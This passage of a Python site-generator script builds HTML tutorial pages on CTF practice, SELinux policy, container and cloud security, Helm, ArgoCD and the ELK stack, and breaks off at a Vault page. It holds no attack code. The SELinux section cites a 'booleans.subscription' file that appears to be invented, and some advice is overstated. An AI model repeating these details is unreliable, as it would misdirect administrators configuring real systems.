             "<p>Common pitfalls include overcomplicating simple challenges (sometimes the flag is in a comment or response header), missing hints in challenge descriptions, and not using search engines to research unfamiliar concepts.</p>"),
            ("Practice Platforms",
             "<p>Improve CTF skills through dedicated practice platforms. <strong>TryHackMe</strong> and <strong>Hack The Box</strong> offer structured learning paths with gamified challenges. <strong>picoCTF</strong> (Carnegie Mellon) is excellent for beginners — progressive difficulty with comprehensive writeups. <strong>Cryptopals</strong> focuses exclusively on cryptography challenges. <strong>SmashTheStack</strong> and <strong>OverTheWire</strong> (Bandit, Natas, Leviathan) teach specific skills through wargames.</p>"
             "<p>For binary exploitation practice, try <strong>pwnable.kr</strong>, <strong>pwnable.tw</strong>, and <strong>ROP Emporium</strong> (focused on return-oriented programming). Web-specific practice: <strong>WebSec Academy</strong> (PortSwigger), <strong>PentesterLab</strong>, and <strong>HackTheBox Web Challenges</strong>. Read writeups on <strong>CTFtime</strong> after competitions — understanding how top teams solved challenges is the fastest way to learn.</p>"),
        ],
        further=[
            ("CTFtime", "The central CTF calendar with upcoming competitions, team rankings, and challenge writeups.", "https://ctftime.org/"),
            ("picoCTF", "Free CTF platform from Carnegie Mellon — great for beginners.", "https://picoctf.org/"),
            ("OverTheWire Wargames", "Progressive wargames covering Linux, web, and cryptography.", "https://overthewire.org/wargames/"),
        ],
    )

    build_page(
        title="SELinux Policy Writing",
        filename="selinux-policy-writing.html",
        desc="Master SELinux policy development — understand contexts, booleans, type enforcement, and audit log analysis for mandatory access control.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("SELinux Concepts and Contexts",
             "<p>SELinux enforces mandatory access control (MAC) on Linux using security contexts — labels applied to files (<code>ls -Z</code>), processes (<code>ps -Z</code>), and ports. Each context has four components: <strong>user</strong>, <strong>role</strong>, <strong>type</strong>, and <strong>level</strong> (MLS). The <strong>type</strong> is the primary enforcement mechanism in targeted policy — rules define which types can access which others. Example context: <code>system_u:object_r:httpd_sys_content_t:s0</code>.</p>"
             "<p>Manage contexts with <code>chcon</code> (temporary), <code>semanage fcontext</code> (persistent), and <code>restorecon</code> (reset to policy defaults). Check current mode with <code>getenforce</code>, switch modes with <code>setenforce 0</code> (permissive) or <code>setenforce 1</code> (enforcing). The SELinux filesystem at <code>/sys/fs/selinux/</code> exposes policy and enforcement state. Use <code>sestatus</code> to get a comprehensive summary.</p>"
             "<pre><code># View security contexts\nls -Z /var/www/html/\nps -Z -p $(pgrep nginx | head -1)\n\n# Set persistent file context\nsemanage fcontext -a -t httpd_sys_content_t '/srv/www(/.*)?'\nrestorecon -Rv /srv/www/</code></pre>"),
            ("Booleans and Tuning",
             "<p>SELinux booleans toggle sets of policy rules without writing custom policies. Common booleans include <code>httpd_can_network_connect</code> (allow Apache to make outbound connections), <code>httpd_enable_homedirs</code> (serve user home directories), <code>ftp_home_dir</code> (FTP access to homes), and <code>samba_export_all_ro</code> (read-only Samba shares for all files).</p>"
             "<p>List all booleans with <code>getsebool -a</code>. Modify them temporarily with <code>setsebool httpd_can_network_connect on</code> or persistently with <code>setsebool -P</code>. Review the <code>booleans.subscription</code> file for distribution-specific recommendations. When troubleshooting, temporarily enabling permissive mode for a domain (<code>semanage permissive -a httpd_t</code>) helps isolate policy issues without fully disabling SELinux.</p>"
             "<ul>"
             "<li><code>getsebool -a</code> — list all booleans with current status</li>"
             "<li><code>setsebool -P httpd_can_network_connect on</code> — enable persistently</li>"
             "<li><code>semanage boolean -l</code> — list booleans with descriptions</li>"
             "</ul>"),
            ("Writing Custom Policies",
             "<p>When existing booleans and types are insufficient, write custom policy modules. Use <code>audit2allow</code> to generate policy from AVC denial logs. The workflow: (1) reproduce the denial, (2) check <code>ausearch -m avc -ts recent</code> or <code>journalctl -t setroubleshoot</code>, (3) pipe to <code>audit2allow -M mymodule</code> to create a module, (4) load it with <code>semodule -i mymodule.pp</code>.</p>"
             "<p>For complex policies, write reference policy manually using the m4 macro system. A minimal <code>.te</code> (type enforcement) file defines module name, required types, and allow rules. The <code>.fc</code> (file context) file specifies labeling for files created by the module. Build with <code>make -f /usr/share/selinux/devel/Makefile mymodule.pp</code>. Use <code>sepolicy generate</code> to auto-generate policy templates for custom applications.</p>"
             "<pre><code># Generate policy from audit log\ngrep \"avc:  denied\" /var/log/audit/audit.log | audit2allow -M myapp\nsemodule -i myapp.pp\n\n# Manual policy template\npolicy_module(myapp, 1.0.0)\nrequire {\n    type httpd_t;\n    type httpd_content_t;\n    class file { read write };\n}\nallow httpd_t httpd_content_t:file { read write };</code></pre>"),
            ("Auditing and Troubleshooting",
             "<p>Effective SELinux troubleshooting requires reading AVC denials and using diagnostic tools. Key log locations: <code>/var/log/audit/audit.log</code> (auditd), <code>/var/log/messages</code> (setroubleshoot). The <code>sealert</code> command analyzes denials and provides human-readable solutions: <code>sealert -a /var/log/audit/audit.log</code>. Use <code>ausearch</code> for targeted searches by type, user, or time range.</p>"
             "<p>Common SELinux troubleshooting commands include <code>matchpathcon</code> (check expected context against actual), <code>fixfiles</code> (fix mislabeled filesystem), and <code>semanage permissive -l</code> (list permissive domains). For applications that fail silently, set the domain to permissive temporarily and check if the issue resolves — if yes, the problem is SELinux. Generate a full policy with <code>audit2allow -M fix -a</code> to create a comprehensive fix module.</p>"
             "<pre><code># Search for specific denial type\nausearch -m avc -c httpd -ts today\n\n# Human-readable diagnosis\nsealert -b | grep -A5 \"SELinux is preventing\"\n\n# Check file context\nmatchpathcon /var/www/html/index.html</code></pre>"),
        ],
        further=[
            ("SELinux Documentation", "Official NSA SELinux reference covering policy language and system administration.", "https://selinuxproject.org/"),
            ("Red Hat SELinux Guide", "Comprehensive guide to managing SELinux on RHEL-based systems.", "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9/html-single/using_selinux/index"),
            ("Fedora SELinux Wiki", "Community-maintained SELinux documentation with practical examples.", "https://fedoraproject.org/wiki/SELinux"),
        ],
    )

    build_page(
        title="Container Security Best Practices",
        filename="container-security.html",
        desc="Secure your containerized workloads — image scanning, runtime protection, seccomp profiles, AppArmor, and Kubernetes security contexts.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("Image Security",
             "<p>Container images are the foundation of container security. Start with minimal base images (Alpine, distroless) to reduce attack surface. Scan images for vulnerabilities using tools like <code>Trivy</code>, <code>Grype</code>, or <code>Snyk</code> — integrate scanning into your CI/CD pipeline to block vulnerable images from reaching registries. Example: <code>trivy image nginx:latest --severity HIGH,CRITICAL</code>.</p>"
             "<p>Use <strong>multi-stage builds</strong> to separate build tools from runtime artifacts. Never include secrets (API keys, passwords) in images — use runtime secrets injection (Kubernetes Secrets or Vault). Sign images with <code>cosign</code> and verify signatures in admission controllers. Use a private registry with vulnerability scanning (Harbor, Amazon ECR, Docker Hub auto-scan).</p>"
             "<ul>"
             "<li><code>docker scout</code> — Docker's built-in image analysis and CVE detection</li>"
             "<li><code>slim</code> — automatically slim images by removing unnecessary files</li>"
             "<li><code>dive</code> — inspect layer-by-layer image contents for bloat</li>"
             "</ul>"),
            ("Runtime Security",
             "<p>Runtime security protects containers at execution time. Run containers as non-root with read-only root filesystems. Use <code>docker run --read-only --user 1000:1000</code> to enforce both. Drop all Linux capabilities by default and add only required ones: <code>--cap-drop=ALL --cap-add=NET_BIND_SERVICE</code>. Set resource limits with <code>--memory=512m --cpus=0.5</code> to prevent DoS.</p>"
             "<p>Tools like <strong>Falco</strong> (CNCF) detect anomalous runtime behavior — unexpected shell executions, privilege escalations, or file writes. Falco uses kernel eBPF probes and rules written in YAML. Rules trigger alerts via stdout, Kubernetes events, or Falco Sidekick integrations (Slack, PagerDuty, S3). Deploy Falco as a DaemonSet in Kubernetes clusters for node-level monitoring.</p>"
             "<pre><code># Run container with security best practices\ndocker run --rm \\\n  --read-only \\\n  --user 1000:1000 \\\n  --cap-drop=ALL \\\n  --cap-add=NET_BIND_SERVICE \\\n  --security-opt=no-new-privileges:true \\\n  --tmpfs /run:size=64m \\\n  myapp:latest</code></pre>"),
            ("Seccomp and AppArmor",
             "<p><strong>Seccomp</strong> (Secure Computing Mode) restricts the system calls a container can make, reducing the kernel attack surface. Docker ships with a default seccomp profile that blocks ~44 dangerous syscalls (e.g., <code>kexec_load</code>, <code>reboot</code>, <code>swapon</code>). Custom profiles are JSON files enumerating allowed syscalls with their architecture and action (<code>SCMP_ACT_ALLOW</code> or <code>SCMP_ACT_ERRNO</code>).</p>"
             "<p><strong>AppArmor</strong> provides mandatory access control profiles for individual programs. Container runtimes can load AppArmor profiles to restrict file access, network operations, and capability usage. Apply a profile with <code>docker run --security-opt apparmor=my-profile</code>. Generate profiles using <code>aa-genprof</code> or <code>aa-autodep</code> — these tools learn application behavior and create minimal policies.</p>"
             "<pre><code># Seccomp profile limiting to essential syscalls\n{\"defaultAction\": \"SCMP_ACT_ERRNO\",\n \"architectures\": [\"SCMP_ARCH_X86_64\"],\n \"syscalls\": [{\"names\": [\"read\",\"write\",\"open\",\"close\",\n    \"mmap\",\"mprotect\",\"brk\",\"exit_group\"],\n    \"action\": \"SCMP_ACT_ALLOW\"}]}</code></pre>"),
            ("Kubernetes Security Contexts",
             "<p>Kubernetes <code>PodSecurityContext</code> and <code>SecurityContext</code> enforce container-level security policies. Set these in your pod specs to control user IDs, group IDs, filesystem group changes, and privilege escalation. A secure pod security context includes <code>runAsNonRoot: true</code>, <code>runAsUser: 1000</code>, <code>allowPrivilegeEscalation: false</code>, and <code>readOnlyRootFilesystem: true</code>.</p>"
             "<p><strong>Pod Security Admission</strong> (replacing PSP) applies predefined security levels: <code>privileged</code>, <code>baseline</code>, and <code>restricted</code>. Use the <code>restricted</code> level for production workloads — it enforces seccomp profiles, drops all capabilities, and requires non-root execution. <strong>OPA Gatekeeper</strong> or <strong>Kyverno</strong> provide custom admission policies for advanced controls like disallowing host network access or enforcing image registries.</p>"
             "<pre><code>apiVersion: v1\nkind: Pod\nspec:\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n  - name: app\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop: [\"ALL\"]</code></pre>"),
        ],
        further=[
            ("OWASP Docker Security Cheat Sheet", "Comprehensive guide to securing Docker containers from the OWASP community.", "https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html"),
            ("Kubernetes Security Documentation", "Official K8s security docs including Pod Security Standards and admission controllers.", "https://kubernetes.io/docs/concepts/security/"),
            ("Falco Project", "CNCF runtime security project — detect anomalous container behavior.", "https://falco.org/"),
        ],
    )

    build_page(
        title="Cloud Security Fundamentals",
        filename="cloud-security-basics.html",
        desc="Understand the core principles of cloud security — shared responsibility, IAM, encryption, logging, and cloud security posture management.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("Shared Responsibility Model",
             "<p>The shared responsibility model defines the security boundary between cloud providers and customers. Providers (AWS, Azure, GCP) secure the <strong>cloud infrastructure</strong> — physical data centers, network, hypervisors, and hardware. Customers secure <strong>everything inside the cloud</strong> — data, applications, identity management, operating systems, network configurations, and access controls.</p>"
             "<p>The exact division varies by service type. With <strong>IaaS</strong> (EC2, GCE), you manage the OS, runtime, and applications. <strong>PaaS</strong> (RDS, Cloud SQL) shifts OS and middleware responsibility to the provider but you still control data and access. <strong>SaaS</strong> (Office 365, Salesforce) minimizes customer responsibility — primarily data classification and user access. Always review the <strong>Shared Responsibility Matrix</strong> for each service you use.</p>"
             "<ul>"
             "<li>Customer: Data classification, IAM, network ACLs, encryption, patching (IaaS)</li>"
             "<li>Provider: Physical security, hardware, virtualization layer, global network</li>"
             "<li>Never assume the provider secures your data — configure encryption and access controls explicitly</li>"
             "</ul>"),
            ("Identity and Access Management (IAM)",
             "<p>IAM is the most critical cloud security control. Follow the <strong>principle of least privilege</strong> — grant only the permissions required for a specific task. Create IAM users for humans, IAM roles for services and applications. Use <strong>groups</strong> to manage permissions at scale. Enable <strong>MFA</strong> for all human users (preferably hardware TOTP or FIDO2 security keys).</p>"
             "<p>AWS IAM policies are JSON documents with <code>Effect</code>, <code>Action</code>, <code>Resource</code>, and optional <code>Condition</code> blocks. Use <strong>IAM Access Analyzer</strong> to identify resources shared with external principals. Rotate access keys regularly (every 90 days) and use <strong>Roles Anywhere</strong> or <strong>Workload Identity Federation</strong> instead of long-lived keys. For Azure, use <strong>Managed Identities</strong>; for GCP, use <strong>Service Accounts</strong> with key rotation and IAM Conditions.</p>"
             "<pre><code># AWS IAM policy — least privilege for S3 read\n{\"Version\": \"2012-10-17\",\n \"Statement\": [{\"Effect\": \"Allow\",\n   \"Action\": [\"s3:GetObject\"],\n   \"Resource\": \"arn:aws:s3:::my-bucket/prod/*\",\n   \"Condition\": {\"IpAddress\": {\"aws:SourceIp\": \"10.0.0.0/16\"}}}]}</code></pre>"),
            ("Encryption and Key Management",
             "<p>Encrypt data at rest and in transit using provider-managed or customer-managed keys. Cloud providers offer KMS services: <strong>AWS KMS</strong>, <strong>Azure Key Vault</strong>, <strong>GCP Cloud KMS</strong>. These handle key generation, rotation, and auditing. Use envelope encryption — KMS encrypts a data key, and the data key encrypts the actual data. This prevents exposing your master keys.</p>"
             "<p>For data in transit, enforce TLS 1.2+ across all endpoints. Use <strong>AWS Certificate Manager</strong> (ACM) or <strong>Azure App Service Certificates</strong> for managed certificate provisioning. Encrypt backups, EBS/disk volumes (default for most cloud volumes), S3 objects (SSE-S3, SSE-KMS, or SSE-C), and database storage. Never use provider-default encryption-only — configure your own KMS keys and key rotation policies.</p>"
             "<p>Cloud HSM (AWS CloudHSM, Azure Dedicated HSM, GCP Cloud HSM) provides FIPS 140-2 Level 3 validated hardware security modules for regulated workloads. Use <strong>key rotation policies</strong> with annual automatic rotation for CMKs. Audit key usage with CloudTrail / Azure Monitor / Cloud Audit Logs.</p>"),
            ("Logging and Monitoring",
             "<p>Comprehensive logging is essential for incident detection and forensics. Enable <strong>AWS CloudTrail</strong> (management events + data events), <strong>Azure Monitor</strong> with <strong>Diagnostic Settings</strong>, and <strong>GCP Cloud Audit Logs</strong>. Stream logs to centralized SIEM tools like <strong>Splunk</strong>, <strong>ELK Stack</strong>, or <strong>Azure Sentinel</strong> for correlation and alerting.</p>"
             "<p>Define <strong>Cloud Security Posture Management (CSPM)</strong> rules to continuously assess your environment. CSPM tools (AWS Security Hub, Azure Defender, GCP Security Command Center, or third-party like Prisma Cloud, Wiz) check for misconfigurations — public S3 buckets, overly permissive security groups, unencrypted volumes, and missing logging. Set up automated remediation actions (e.g., auto-remediate public S3 buckets via EventBridge and Lambda).</p>"
             "<pre><code># AWS Security Hub — enable standards\naws securityhub enable-security-hub \\\n  --enable-standards arn:aws:securityhub:us-east-1::standards/aws-foundational-security-best-practices/v/1.0.0\n\n# Check S3 bucket public access\naws s3api get-public-access-block --bucket my-bucket</code></pre>"),
        ],
        further=[
            ("AWS Well-Architected Security Pillar", "AWS documentation on security best practices for cloud architecture.", "https://docs.aws.amazon.com/wellarchitected/latest/security-pillar/"),
            ("Azure Security Benchmark", "Microsoft's security baseline covering identity, data protection, and network security.", "https://learn.microsoft.com/en-us/security/benchmark/azure/"),
            ("GCP Security Foundation", "Google's blueprint for setting up a secure GCP environment.", "https://cloud.google.com/architecture/security-foundations"),
        ],
    )

    # ------------------------------------------------------------------------
    # DEVOPS (10)
    # ------------------------------------------------------------------------

    build_page(
        title="Helm Charts for Kubernetes",
        filename="helm-charts.html",
        desc="Learn Helm for packaging, deploying, and managing Kubernetes applications with reusable charts and template-driven releases.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("Understanding Charts",
             "<p>A Helm chart is a collection of files that describe a set of Kubernetes resources. Charts have a standardized directory structure — <code>Chart.yaml</code> (metadata), <code>values.yaml</code> (default configuration), <code>templates/</code> (Go template files), and optional <code>charts/</code> (sub-charts). Create a new chart scaffold with <code>helm create my-chart</code> — this generates all boilerplate files.</p>"
             "<p>The <code>Chart.yaml</code> file defines the chart's API version (<code>v2</code> for Helm 3), app version, description, and dependencies. Dependencies reference other charts (from registries or local paths) that get merged during installation. Use <code>helm dependency update</code> to download chart dependencies into the <code>charts/</code> directory. Charts are packaged as <code>.tgz</code> archives with <code>helm package</code>.</p>"
             "<ul>"
             "<li><code>Chart.yaml</code> — name, version, description, dependencies</li>"
             "<li><code>values.yaml</code> — default values injected into templates</li>"
             "<li><code>templates/</code> — Go-template Kubernetes manifests with <code>{{ .Values.xxx }}</code></li>"
             "<li><code>templates/NOTES.txt</code> — post-install usage instructions</li>"
             "</ul>"),
            ("Templates and Values",
             "<p>Go templates in Helm use the <code>{{ }}</code> syntax to inject values from <code>values.yaml</code>, built-in objects (<code>Release</code>, <code>Chart</code>, <code>Files</code>), and pipeline functions like <code>quote</code>, <code>upper</code>, and <code>default</code>. The <code>values.yaml</code> provides sensible defaults that users override at install time with <code>--values</code> or <code>--set</code>. Use <code>--set key=value</code> for simple overrides, <code>--values custom.yaml</code> for complex configurations.</p>"
             "<p>Advanced template features include flow control (<code>if-else</code>, <code>range</code> loops), variable assignment (<code>$myvar := .Values.db.name</code>), and named templates (<code>define</code>/<code>template</code> or <code>include</code> with <code>tpl</code>). The <code>_helpers.tpl</code> file stores reusable template definitions. Use <code>helm lint</code> to check for template errors and <code>helm template --debug</code> to render templates locally without contacting a cluster.</p>"
             "<pre><code># values.yaml\nreplicaCount: 3\nimage:\n  repository: nginx\n  tag: stable\nservice:\n  port: 80\n\n# templates/deployment.yaml (partial)\nspec:\n  replicas: {{ .Values.replicaCount }}\n  template:\n    spec:\n      containers:\n      - name: {{ .Chart.Name }}\n        image: \"{{ .Values.image.repository }}:{{ .Values.image.tag }}\"</code></pre>"),
            ("Repositories and Releases",
             "<p>Helm repositories are HTTP/HTTPS servers hosting packaged charts. Add a repository with <code>helm repo add bitnami https://charts.bitnami.com/bitnami</code>, list repositories with <code>helm repo list</code>, and search with <code>helm search repo bitnami/nginx</code>. Update repository indexes with <code>helm repo update</code>. Popular public repos include Bitnami, Jetstack (cert-manager), and the official stable repository.</p>"
             "<p>Helm 3 manages releases as Kubernetes secrets in the target namespace (<code>helm list -n my-namespace</code>). Install a release with <code>helm install my-release bitnami/nginx --namespace default</code>. Upgrade with <code>helm upgrade --install my-release bitnami/nginx --values prod-values.yaml</code>. Rollback with <code>helm rollback my-release 1</code>. Use <code>helm history my-release</code> to view revision history. Each revision stores the full manifest, enabling deterministic rollbacks.</p>"),
            ("Chart Best Practices",
             "<p>Follow the Helm chart best practices guide for production-ready charts. Use <code>helm create</code> as a starting point. Structure values with logical groupings (image, service, ingress, resources, autoscaling). Provide meaningful defaults in <code>values.yaml</code> with comments explaining each field. Use <code>helm lint</code> and <code>helm test</code> (test pods verifying functionality) in CI pipelines.</p>"
             "<p>Version your charts with <a href=\"https://semver.org/\">semver</a> — increment <code>major.minor.patch</code> based on backward compatibility. Store charts in OCI-compatible registries for better access control: <code>helm push mychart-0.1.0.tgz oci://myregistry.example.com/charts</code>. Sign charts with GPG and verify signatures before deployment. Use <code>helm plugin install</code> to add push, diff, and unittest plugins.</p>"
             "<pre><code># Chart.yaml\napiVersion: v2\nname: myapp\ndescription: A production-ready web application\nversion: 0.1.0\nappVersion: 1.16.0\ndependencies:\n  - name: postgresql\n    version: ~12.0\n    repository: https://charts.bitnami.com/bitnami</code></pre>"),
        ],
        further=[
            ("Helm Documentation", "Official Helm documentation covering installation, charts, and CLI reference.", "https://helm.sh/docs/"),
            ("ArtifactHub", "Public registry for finding and sharing Helm charts.", "https://artifacthub.io/"),
            ("Helm Best Practices", "Official guide to writing production-quality Helm charts.", "https://helm.sh/docs/chart_best_practices/"),
        ],
    )

    build_page(
        title="ArgoCD & GitOps",
        filename="argocd-gitops.html",
        desc="Implement GitOps workflows with ArgoCD — declarative Kubernetes deployments, sync strategies, multi-cluster management, and best practices.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("GitOps Principles",
             "<p>GitOps operationalizes Git as the single source of truth for infrastructure and application configuration. The desired state is declaratively defined in a Git repository, and an operator (like ArgoCD) continuously reconciles the live cluster state with the repository. If drift occurs (manual changes, failed updates), the operator automatically reverts to the desired state.</p>"
             "<p>The four GitOps principles are: (1) the entire system is described declaratively, (2) the desired state is versioned in Git, (3) approved changes are automatically applied to the system, and (4) drift correction ensures the live state matches the desired state. This model enables Git-based collaboration (pull requests, code review, commit history), clear audit trails, and easy rollbacks via <code>git revert</code> or <code>git reset</code>.</p>"
             "<ul>"
             "<li>Single source of truth eliminates configuration drift</li>"
             "<li>Full audit trail — every change is a Git commit</li>"
             "<li>Instant disaster recovery — redeploy from the repository</li>"
             "<li>Developer-friendly — contributors use familiar Git workflows</li>"
             "</ul>"),
            ("Declarative Deployments",
             "<p>ArgoCD deploys Kubernetes manifests stored in Git repositories. It supports raw YAML, Helm charts, Kustomize overlays, Jsonnet, and custom plugins. Applications are defined as <code>Application</code> CRDs with source (repository path, target revision) and destination (cluster, namespace). ArgoCD continuously syncs applications, showing clear sync status (Synced, OutOfSync, Unknown, or Failed).</p>"
             "<p>The ArgoCD UI provides a topology view showing all Kubernetes resources managed by an application — deployments, services, configmaps, secrets. Color-coded health status (healthy, degraded, progressing, missing) helps quickly identify issues. The <code>argocd</code> CLI mirrors the UI functionality for scripting: <code>argocd app sync my-app</code>, <code>argocd app get my-app</code>, <code>argocd app diff my-app</code>.</p>"
             "<pre><code>apiVersion: argoproj.io/v1alpha1\nkind: Application\nmetadata:\n  name: my-app\nspec:\n  project: default\n  source:\n    repoURL: https://github.com/team/my-app-deploy.git\n    targetRevision: main\n    path: k8s/overlays/production\n  destination:\n    server: https://kubernetes.default.svc\n    namespace: production\n  syncPolicy:\n    automated:\n      prune: true\n      selfHeal: true</code></pre>"),
            ("Sync Strategies",
             "<p>ArgoCD offers several sync strategies: <strong>manual</strong> (triggered via UI/CLI), <strong>automated</strong> (sync on repo changes), and <strong>automated with prune</strong> (remove resources not in Git). Automated sync with <code>selfHeal: true</code> ensures drift is corrected within seconds. Use <strong>prune propagation policy</strong> (<code>foreground</code>, <code>background</code>, <code>orphan</code>) to control how deleted resources are cleaned up.</p>"
             "<p><strong>Sync windows</strong> restrict when syncs can occur — useful for production blackout periods. <strong>Progressive sync</strong> with waves lets you control the order of resource deployment (CRDs first, namespaces second, workloads third). The <code>argocd.argoproj.io/sync-wave</code> annotation assigns resources to waves. Use <code>sync-phases</code> for pre-sync, sync, and post-sync hooks that run scripts (database migrations, smoke tests) during deployments.</p>"
             "<p>For multi-environment deployments, use <strong>ApplicationSets</strong> with generators (list, git, cluster, matrix) to dynamically create Applications per environment or per cluster, reducing repetitive configuration.</p>"),
            ("Multi-Cluster Management",
             "<p>ArgoCD manages multiple Kubernetes clusters from a single control plane. Register clusters with <code>argocd cluster add context-name</code> and list them with <code>argocd cluster list</code>. Each cluster can have different destinations defined in the Application spec. The <strong>cluster generator</strong> in ApplicationSets dynamically creates applications for each registered cluster, optionally filtered by labels.</p>"
             "<p>ArgoCD handles cluster credentials securely — stored in Kubernetes secrets within the ArgoCD namespace (<code>argocd-secret</code>). Use <strong>SSO integration</strong> (OIDC, Dex, GitHub, GitLab, Microsoft) for authentication. <strong>RBAC</strong> with scoped roles (<code>role:admin</code>, <code>role:readonly</code>) controls user access per project, cluster, or application. Enable <strong>audit logging</strong> to track all ArgoCD API and sync operations.</p>"
             "<pre><code># Register a remote cluster\nargocd cluster add production-cluster --name production\n\n# List applications across all clusters\nargocd app list --cluster https://production.example.com\n\n# ApplicationSet with cluster generator\napiVersion: argoproj.io/v1alpha1\nkind: ApplicationSet\nspec:\n  generators:\n  - clusters:\n      selector:\n        matchLabels:\n          env: production</code></pre>"),
        ],
        further=[
            ("ArgoCD Documentation", "Official ArgoCD docs covering installation, core concepts, and advanced features.", "https://argo-cd.readthedocs.io/"),
            ("GitOps Principles", "Weaveworks' original GitOps article defining the operational model.", "https://www.weave.works/technologies/gitops/"),
            ("Codefresh GitOps Guide", "Practical tutorials for implementing GitOps with ArgoCD and Flagger.", "https://codefresh.io/learn/gitops/"),
        ],
    )

    build_page(
        title="ELK Stack: Elasticsearch, Logstash, Kibana",
        filename="elk-stack-guide.html",
        desc="Centralize log aggregation, search, and visualization using the ELK Stack — Elasticsearch clustering, Logstash pipelines, and Kibana dashboards.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("Elasticsearch Cluster",
             "<p>Elasticsearch is a distributed search and analytics engine built on Apache Lucene. It stores data as JSON documents in indices, with sharding for horizontal scaling. A cluster consists of nodes — each node holds one or more shards (primary and replica). Configure <code>elasticsearch.yml</code> with cluster name, node roles (master, data, ingest), and discovery settings for production deployments.</p>"
             "<p>Index management is critical for performance. Use index templates (<code>PUT _index_template/my-template</code>) to define mappings, settings, and aliases for time-based indices. Create <strong>ILM (Index Lifecycle Management)</strong> policies to automate hot → warm → cold → delete transitions. Monitor cluster health with <code>GET _cluster/health</code>, optimize with <code>_forcemerge</code> on read-only indices, and use shard allocation awareness for rack/zone isolation.</p>"
             "<pre><code># Index template for logs\nPUT _index_template/my-logs\n{\"index_patterns\": [\"logs-*\"],\n \"template\": {\"settings\": {\"number_of_shards\": 2,\n   \"number_of_replicas\": 1},\n   \"mappings\": {\"properties\": {\"@timestamp\": {\"type\": \"date\"},\n     \"message\": {\"type\": \"text\"},\n     \"level\": {\"type\": \"keyword\"}}}}}</code></pre>"),
            ("Logstash Pipelines",
             "<p>Logstash ingests, transforms, and ships data to Elasticsearch. A pipeline has three stages: <strong>input</strong> (Beats, TCP, syslog, file, or Kafka), <strong>filter</strong> (grok, mutate, date, geoip, useragent), and <strong>output</strong> (Elasticsearch, S3, stdout). The <code>grok</code> filter is the most powerful — it parses unstructured log lines into structured fields using predefined patterns like <code>%{COMBINEDAPACHELOG}</code>.</p>"
             "<p>Pipeline configuration lives in <code>/etc/logstash/conf.d/</code>. A typical syslog pipeline reads from <code>port 514</code>, applies grok for log parsing, adds timestamps, and outputs to Elasticsearch. Use <code>mutate</code> to rename/remove fields, <code>geoip</code> for IP geolocation enrichment, and <code>elasticsearch</code> filter for cross-referencing data. Test pipelines with <code>logstash -f pipeline.conf --config.test_and_exit</code>.</p>"
             "<pre><code># Logstash pipeline — Apache log parsing\ninput { beats { port => 5044 } }\nfilter {\n  grok { match => { \"message\" => \"%{COMBINEDAPACHELOG}\" } }\n  date { match => [\"timestamp\", \"dd/MMM/yyyy:HH:mm:ss Z\"] }\n  geoip { source => \"clientip\" }\n}\noutput {\n  elasticsearch { hosts => [\"localhost:9200\"]\n    index => \"apache-logs-%{+YYYY.MM.dd}\" }\n}</code></pre>"),
            ("Kibana Dashboards",
             "<p>Kibana is the visualization and management interface for Elasticsearch. Create <strong>Data Views</strong> (<code>Stack Management > Data Views</code>) to define which indices you want to explore. Use <strong>Discover</strong> for ad-hoc search — the Kibana Query Language (KQL) lets you filter with <code>level: ERROR</code> and <code>@timestamp &gt; now-24h</code>. Save searches as reusable patterns for dashboards.</p>"
             "<p>The <strong>Visualize Library</strong> supports bar charts, line charts, pie charts, heat maps, maps (with geo data), and TSVB (time-series visual builder). Combine visualizations into <strong>Dashboards</strong> with interactive filters and drill-down capabilities. Use <strong>Canvas</strong> for pixel-perfect infographics and <strong>Maps</strong> for geographic data overlays. Set up <strong>Alerting</strong> to trigger actions (email, Slack, PagerDuty) when query thresholds are met.</p>"
             "<ul>"
             "<li><strong>Discover</strong> — search and filter log data in real time</li>"
             "<li><strong>Dashboard</strong> — combine visualizations with cross-filtering</li>"
             "<li><strong>Canvas</strong> — custom infographic layouts with live data</li>"
             "<li><strong>Alerting</strong> — threshold-based monitoring with multi-channel notifications</li>"
             "</ul>"),
            ("Performance and Scaling",
             "<p>ELK performance tuning involves optimizing each component. For Elasticsearch, allocate <strong>50% of system RAM to the JVM heap</strong> (max 32 GB for compressed OOPs). Use SSDs for data nodes, avoid NFS/network drives. Set <code>index.refresh_interval: 30s</code> for write-heavy workloads (default is 1s). Enable <strong>translog</strong> durability with <code>async</code> for higher write throughput.</p>"
             "<p>Logstash performance improves with <code>pipeline.workers: 4</code> (one per CPU core), <code>pipeline.batch.size: 1250</code>, and <code>pipeline.batch.delay: 50</code>. Use <strong>Kafka</strong> as a buffer between Logstash and Elasticsearch to handle throughput spikes. Security: enable <strong>Elasticsearch Security</strong> (X-Pack), configure TLS, use role-based access control, and audit sensitive index access.</p>"
             "<pre><code># JVM heap configuration (jvm.options)\n-Xms8g\n-Xmx8g\n\n# Elasticsearch thread pool settings\nthread_pool:\n  write:\n    size: 4\n    queue_size: 1000\n\n# ILM policy for log retention\nPUT _ilm/policy/logs_policy\n{\"policy\": {\"phases\": {\"hot\": {\"min_age\": \"0ms\",\n   \"actions\": {\"rollover\": {\"max_size\": \"50GB\",\n     \"max_age\": \"30d\"}}}}}}</code></pre>"),
        ],
        further=[
            ("Elasticsearch Reference", "Official Elasticsearch documentation covering setup, APIs, and configuration.", "https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html"),
            ("Logstash Reference", "Complete reference for Logstash plugins, pipeline configuration, and deployment.", "https://www.elastic.co/guide/en/logstash/current/index.html"),
            ("Kibana Guide", "Official Kibana user guide for dashboards, visualizations, and alerts.", "https://www.elastic.co/guide/en/kibana/current/index.html"),
        ],
    )

    build_page(
        title="HashiCorp Vault Secrets",
        filename="vault-secrets-management.html",
        desc="Manage secrets, encryption keys, and access control with HashiCorp Vault — secrets engines, dynamic secrets, policies, and integration patterns.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("Secrets Engines",
